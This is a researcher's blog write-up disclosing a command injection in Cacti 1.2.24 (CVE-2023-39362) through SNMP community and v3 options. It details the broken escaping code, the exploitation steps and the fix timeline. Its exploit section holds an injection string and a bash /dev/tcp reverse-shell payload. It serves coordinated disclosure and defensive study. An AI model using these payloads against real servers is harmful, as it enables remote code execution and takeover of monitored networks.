---
layout: post
title: "Cacti 1.2.24 - Authenticated command injection when using SNMP options (CVE-2023-39362)"
date: 2023-07-04 04:55
---

In **Cacti 1.2.24**, under certain conditions, an authenticated privileged user, can use a malicious string in the SNMP options of a Device, performing command injection and obtaining **remote code execution** on the underlying server.

In the depicted scenarios, the reported command injection could lead a disgruntled user or a compromised account to take over the underlying server on which Cacti is installed and then reach other hosts, e.g., ones monitored by it.

## Table of Contents

* [Genesis](#genesis)
* [SNMP](#snmp)
* [Root Cause](#root-cause)
* [Prerequisites](#prerequisites)
* [Example of an exploit](#example-of-an-exploit)
* [CVSS v3](#cvss-v3)
* [Video](#video)
* [Timeline](#timeline)
* [References](#references)

![www.craiyon.com - A frightened humanoid cactus in the desert](images/craiyon_053137_A_frightened_humanoid_cactus_in_the_desert.png)

## Genesis

Being a fanatic of automatic security checks, I was working on a personal project about automating [Semgrep](https://semgrep.dev/) scans via [GitHub Actions](https://github.com/features/actions), experimenting some custom integrations and playing with different rules of the tool. As a test target to do my experiments, I decided to use the open source code of [Cacti](https://www.cacti.net/).

> Cacti is a robust performance and fault management framework and a frontend to RRDTool - a Time Series Database (TSDB). It stores all of the necessary information to create performance management Graphs in either MariaDB or MySQL, and then leverages its various Data Collectors to populate RRDTool based TSDB with that performance data. Cacti is also a LAMP stack Web Application.

I chose it as a target because:
* it's written in PHP, a language that I know decently and is also supported by Semgrep;
* due to it's nature, it contains a broad number of different scenarios that could appear in a web application, e.g., SQL queries, redirects, files management, *command executions*, and so on;
* I already had a look at it, with some friends, during our weekly hacking nights, when we analyzed the [CVE-2022-46169 / GHSA-6p93-p743-35gf](https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf) and its root cause.
So it seemed the perfect candidate to me!</p>

Among the other Semgrep rules, the [PHP `exec-use` rule](https://semgrep.dev/playground/r/php.lang.security.exec-use.exec-use?editorMode=advanced) was run. A bunch of findings reported in the `lib/snmp.php` file caught my attention and for this reason I started to investigate deeper.</p>

## SNMP

From [Wikipedia](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol):
> Simple Network Management Protocol (SNMP) is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behaviour. Devices that typically support SNMP include cable modems, routers, switches, servers, workstations, printers, and more.

A useful tool to simulate the presence of a SNMP device is [xeemetric/snmp-simulator](https://github.com/xeemetric/snmp-simulator), also available as [Docker container](https://hub.docker.com/r/xeemetric/snmp-simulator/dockerfile).

To interact with an SNMP device, you can use the `snmpget` utility, for example with a command like the following launched on the simulated SNMP device.

```
snmpget -v2c -c public 127.0.0.1 .1.3.6.1.2.1.1.1.0
```

## Root Cause

The `lib/snmp.php` file has a set of functions, with similar behavior, that accept in input some variables and place them into an `exec` call without a proper escape or validation. These functions are:
* `cacti_snmp_get`;
* `cacti_snmp_get_raw`;
* `cacti_snmp_getnext`;
* `cacti_snmp_walk` (slightly different).

In general, the implementation pattern is something like the following.

```php
function cacti_snmp_get(..., $community, ... , $auth_user = '', $auth_pass = '',
    $auth_proto = '', $priv_pass = '', $priv_proto = '', $context = '',
    ...,
    $engineid = '', ...) {

    // ...

    if (!cacti_snmp_options_sanitize($version, $community, $port, $timeout_ms, $retries, $max_oids)) {
        return 'U';
    }

    if (snmp_get_method('get', $version, $context, $engineid, $value_output_format) == SNMP_METHOD_PHP) {
        
        // ...
        
    } else {
        
        // ...

        if ($version == '1') {
            $snmp_auth = '-c ' . snmp_escape_string($community); /* v1/v2 - community string */
        } elseif ($version == '2') {
            $snmp_auth = '-c ' . snmp_escape_string($community); /* v1/v2 - community string */
            // ...
        } elseif ($version == '3') {
            $snmp_auth = cacti_get_snmpv3_auth($auth_proto, $auth_user, $auth_pass, $priv_proto, $priv_pass, $context, $engineid);
        }

        // ...

        exec(cacti_escapeshellcmd(read_config_option('path_snmpget')) .
            ' -O fntevU' . ($value_output_format == SNMP_STRING_OUTPUT_HEX ? 'x ':' ') . $snmp_auth .
            ' -v ' . $version .
            ' -t ' . $timeout_s .
            ' -r ' . $retries .
            ' '    . cacti_escapeshellarg($hostname) . ':' . $port .
            ' '    . cacti_escapeshellarg($oid), $snmp_value);

        // ...
    }

    // ...
}
```

The first method called is the `cacti_snmp_options_sanitize`, but analyzing the source code it's clear that no checks are performed on the `$community` parameter, except for a comparison with an empty string when SNMP version is not 3.

```php
function cacti_snmp_options_sanitize($version, $community, &$port, &$timeout, &$retries, &$max_oids) {
    /* determine default retries */
    if ($retries == 0 || !is_numeric($retries)) {
        $retries = read_config_option('snmp_retries');

        if ($retries == '') {
            $retries = 3;
        }
    }

    /* determine default max_oids */
    if ($max_oids == 0 || !is_numeric($max_oids)) {
        $max_oids = read_config_option('max_get_size');

        if ($max_oids == '') {
            $max_oids = 10;
        }
    }

    /* determine default port */
    if (empty($port)) {
        $port = '161';
    }

    /* do not attempt to poll invalid combinations */
    if (($version == 0) || (!is_numeric($version)) ||
        (!is_numeric($max_oids)) ||
        (!is_numeric($port)) ||
        (!is_numeric($retries)) ||
        (!is_numeric($timeout)) ||
        (($community == '') && ($version != 3))
        ) {

        return false;
    }

    return true;
}
```

At this point, an `if` clause is placed to guard next instructions via the execution of `snmp_get_method` function. The purpose of this function seems to be understanding if SNMP operations must be performed via PHP features or calling underlying OS commands (via the `exec` function).

```php
function snmp_get_method($type = 'walk', $version = 1, $context = '', $engineid = '',
    $value_output_format = SNMP_STRING_OUTPUT_GUESS) {

    global $config;

    if (isset($config['php_snmp_support']) && !$config['php_snmp_support']) {
        return SNMP_METHOD_BINARY;
    } elseif ($value_output_format == SNMP_STRING_OUTPUT_HEX) {
        return SNMP_METHOD_BINARY;
    } elseif ($version == 3) {
        return SNMP_METHOD_BINARY;
    } elseif ($type == 'walk' && file_exists(read_config_option('path_snmpbulkwalk'))) {
        return SNMP_METHOD_BINARY;
    } elseif (function_exists('snmpget') && $version == 1) {
        return SNMP_METHOD_PHP;
    } elseif (function_exists('snmp2_get') && $version == 2) {
        return SNMP_METHOD_PHP;
    } else {
        return SNMP_METHOD_BINARY;
    }
}
```

The second scenario can happen, for example, when the `snmp` module of PHP is not installed. This module is considered optional during the installation of Cacti.

At this point, an `if-elseif` clause is used to understand what is the SNMP version used by the device. The result of the processing is stored in the variable `$snmp_auth` that is simply concatenated to the input of the `exec` function, without any further check or escape.

Before that, for SNMP versions 1 and 2, the `snmp_escape_string` function is called on the `$community` variable. The purpose of the method is:
* understand if a quotation mark is used in the passed string and add a backslash to escape it;
* return the escaped string between quotation marks. 

```php
function snmp_escape_string($string) {
    global $config;

    if (! defined('SNMP_ESCAPE_CHARACTER')) {
        if ($config['cacti_server_os'] == 'win32') {
            define('SNMP_ESCAPE_CHARACTER', '"');
        } else {
            define('SNMP_ESCAPE_CHARACTER', "'");
        }
    }

    if (substr_count($string, SNMP_ESCAPE_CHARACTER)) {
        $string = str_replace(SNMP_ESCAPE_CHARACTER, "\\" . SNMP_ESCAPE_CHARACTER, $string);
    }

    return SNMP_ESCAPE_CHARACTER . $string . SNMP_ESCAPE_CHARACTER;
}
```

This function can be easily tricked adding an already escaped quotation mark in the input, e.g., `\'` for Linux-based systems. In this case, the quotation mark will be replaced by its escaped version, but the presence of the original backslash will result in the backslash added by the function to be escaped, i.e. `\\'`, making the quotation mark a legit one.

For example, assuming the string `public` as a legit input, the final string that will be used as input for the `exec` function will be the following.

```
/usr/bin/snmpget -O fntevU -c 'public' -v 2c -t 1 -r 1 '<host>':<port> '<oid>'
```

But using a malicious string like `public\' ; touch /tmp/m3ssap0 ; \'` will produce the following result.

```
/usr/bin/snmpget -O fntevU -c 'public\\' ; touch /tmp/m3ssap0 ; \\'' -v 2c -t 1 -r 1 '<host>':<port> '<oid>'
```

Breaking the command concatenation and injecting an arbitrary command in it.

For SNMP version 3 it's a little bit more complex, but analyzing the `cacti_get_snmpv3_auth` function it is clear that only the `snmp_escape_string` function is used as a security measure.

```php
function cacti_get_snmpv3_auth($auth_proto, $auth_user, $auth_pass, $priv_proto, $priv_pass, $context, $engineid) {
    $sec_details = ' -a ' . snmp_escape_string($auth_proto) . ' -A ' . snmp_escape_string($auth_pass);
    if ($priv_proto == '[None]' || $priv_pass == '') {
        if ($auth_pass == '' || $auth_proto == '[None]') {
            $sec_level   = 'noAuthNoPriv';
            $sec_details = '';
        } else {
            $sec_level   = 'authNoPriv';
        }

        $priv_proto = '';
        $priv_pass  = '';
    } else {
        $sec_level = 'authPriv';
        $priv_pass = '-X ' . snmp_escape_string($priv_pass) . ' -x ' . snmp_escape_string($priv_proto);
    }

    if ($context != '') {
        $context = '-n ' . snmp_escape_string($context);
    } else {
        $context = '';
    }

    if ($engineid != '') {
        $engineid = '-e ' . snmp_escape_string($engineid);
    } else {
        $engineid = '';
    }

    return trim('-u ' . snmp_escape_string($auth_user) .
        ' -l ' . snmp_escape_string($sec_level) .
        ' '    . $sec_details .
        ' '    . $priv_pass .
        ' '    . $context .
        ' '    . $engineid);
}
```

All these input values are read from the user via the `form_save` function in the `host.php` file.

```php
function form_save() {
    if (isset_request_var('save_component_host')) {
        if (get_nfilter_request_var('snmp_version') == 3 && (get_nfilter_request_var('snmp_password') != get_nfilter_request_var('snmp_password_confirm'))) {
            raise_message(14);
        } else if (get_nfilter_request_var('snmp_version') == 3 && (get_nfilter_request_var('snmp_priv_passphrase') != get_nfilter_request_var('snmp_priv_passphrase_confirm'))) {
            raise_message(13);
        } else {
            get_filter_request_var('id');
            get_filter_request_var('host_template_id');

            $host_id = api_device_save(...,
                ..., get_nfilter_request_var('snmp_community'), get_nfilter_request_var('snmp_version'),
                get_nfilter_request_var('snmp_username'), get_nfilter_request_var('snmp_password'),
                get_nfilter_request_var('snmp_port'), get_nfilter_request_var('snmp_timeout'),
                ..., 
                get_nfilter_request_var('snmp_auth_protocol'), get_nfilter_request_var('snmp_priv_passphrase'),
                get_nfilter_request_var('snmp_priv_protocol'), get_nfilter_request_var('snmp_context'),
                get_nfilter_request_var('snmp_engine_id'), ...,
                ...);

            // ...
        }

        // ...
    }
}
```

They are retrieved using `get_nfilter_request_var` function, defined into `lib/html_utility.php` file, that doesn't perform any check.

```php
/* get_nfilter_request_var - returns the value of the request variable deferring
   any filtering.
   @arg $name - the name of the request variable. this should be a valid key in the
     $_POST array
   @arg $default - the value to return if the specified name does not exist in the
     $_POST array
   @returns - the value of the request variable */
function get_nfilter_request_var($name, $default = '') {
    global $_CACTI_REQUEST;

    if (isset($_CACTI_REQUEST[$name])) {
        return $_CACTI_REQUEST[$name];
    } elseif (isset($_REQUEST[$name])) {
        return $_REQUEST[$name];
    } else {
        return $default;
    }
}
```

Then they are saved via the `api_device_save` function, defined into `lib/api_device.php` file. Here some `form_input_validate` functions are called, but several parameters don't have a regex to validate them.

```php
    // ...

    $save['snmp_version']         = form_input_validate($snmp_version, 'snmp_version', '', true, 3);
    $save['snmp_community']       = form_input_validate($snmp_community, 'snmp_community', '', true, 3);

    if ($save['snmp_version'] == 3) {
        $save['snmp_username']        = form_input_validate($snmp_username, 'snmp_username', '', true, 3);
        $save['snmp_password']        = form_input_validate($snmp_password, 'snmp_password', '', true, 3);
        $save['snmp_auth_protocol']   = form_input_validate($snmp_auth_protocol, 'snmp_auth_protocol', "^\[None\]|MD5|SHA|SHA224|SHA256|SHA392|SHA512$", true, 3);
        $save['snmp_priv_passphrase'] = form_input_validate($snmp_priv_passphrase, 'snmp_priv_passphrase', '', true, 3);
        $save['snmp_priv_protocol']   = form_input_validate($snmp_priv_protocol, 'snmp_priv_protocol', "^\[None\]|DES|AES128|AES192|AES256$", true, 3);
        $save['snmp_context']         = form_input_validate($snmp_context, 'snmp_context', '', true, 3);
        $save['snmp_engine_id']       = form_input_validate($snmp_engine_id, 'snmp_engine_id', '', true, 3);

        if (strlen($save['snmp_password']) < 8 && $snmp_auth_protocol != '[None]') {
            raise_message(32);
            $_SESSION['sess_error_fields']['snmp_password'] = 'snmp_password';
        }
    } else {
        $save['snmp_username']        = '';
        $save['snmp_password']        = '';
        $save['snmp_auth_protocol']   = '';
        $save['snmp_priv_passphrase'] = '';
        $save['snmp_priv_protocol']   = '';
        $save['snmp_context']         = '';
        $save['snmp_engine_id']       = '';
    }
    
    // ...
```

As a result, the input is not sufficiently validated from the original source to the sink in the `exec` method.

## Prerequisites

* The attacker is authenticated.
* The privileges of the attacker allows to manage Devices and/or Graphs, e.g., "*Sites/Devices/Data*", "*Graphs*".
* A Device that supports SNMP can be used.
* Net-SNMP Graphs can be used.
* `snmp` module of PHP is not installed.

## Example of an exploit

1. Go to "*Console*" > "*Create*" > "*New Device*".
2. Create a Device that supports SNMP version 1 or 2.
3. Ensure that the Device has Graphs with one or more templates of:
   * "*Net-SNMP - Combined SCSI Disk Bytes*"
   * "*Net-SNMP - Combined SCSI Disk I/O*"
   * (Creating the Device from the template "*Net-SNMP Device*" will satisfy the Graphs prerequisite)
4. In the "*SNMP Options*", for the "*SNMP Community String*" field, use a value like this: `public\' ; touch /tmp/m3ssap0 ; \'`.
5. Click the "*Create*" button.
6. Check under `/tmp` the presence of the created file.

To obtain a reverse shell, a payload like the following can be used.
```
public\' ; bash -c "exec bash -i &>/dev/tcp/<host>/<port> <&1" ; \'
```

A similar exploit can be used editing an existing Device, with the same prerequisites, and waiting for the poller to run. It could be necessary to change the content of the "*Downed Device Detection*" field, under the "*Availability/Reachability Options*" section, with an item that doesn't involve SNMP (because the malicious payload could break the interaction with the host).

## CVSS v3

**Severity**: High (7.2 / 10)

* **Attack vector**: Network
* **Attack complexity**: Low
* **Privileges required**: High
* **User interaction**: None
* **Scope**: Unchanged
* **Confidentiality**: High
* **Integrity**: High
* **Availability**: High

`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`

## Video

<video width="600" controls>
    <source src="./videos/Cacti 1.2.24 - Command injection - Demo.mp4" type="video/mp4">
    Video of the exploit on vulnerable Cacti 1.2.24 installation.
</video>

Exploit executed on a [vulnerable containerized environment](https://github.com/m3ssap0/cacti-rce-snmp-options-vulnerable-application).

## Timeline

* 2023-09-05 - Vulnerability disclosed by Cacti team.
* 2023-08-07 - [CVE-2023-39362](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39362) issued.
* 2023-08-05 - CVE requested.
* 2023-08-04 - Commits with the fix ([cb9ab92](https://github.com/Cacti/cacti/commit/cb9ab92f2580fc6cb9b64ce129655fb15e35d056), [4c26f39](https://github.com/Cacti/cacti/commit/4c26f39fa3567553192823a5e8096b187bbaddde)) and retest.
* 2023-07-04 - Maintainers acknowledged the presence of the vulnerability.
* 2023-07-03 - Finished the analysis, confirmed the vulnerability and reported it to the maintainers.
* 2023-07-02 - Discovered the presence of a possible vulnerability.

## References

* [GitHub Security Advisory (GHSA-g6ff-58cj-x3cp)](https://github.com/Cacti/cacti/security/advisories/GHSA-g6ff-58cj-x3cp)
* [Example of vulnerable application](https://github.com/m3ssap0/cacti-rce-snmp-options-vulnerable-application)
* [Cacti homepage](https://www.cacti.net/)
* [Cacti vulnerable version (1.2.24) source code](https://github.com/Cacti/cacti/tree/release/1.2.24)
* [Wikipedia - SNMP](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol)
* [xeemetric/snmp-simulator](https://github.com/xeemetric/snmp-simulator)
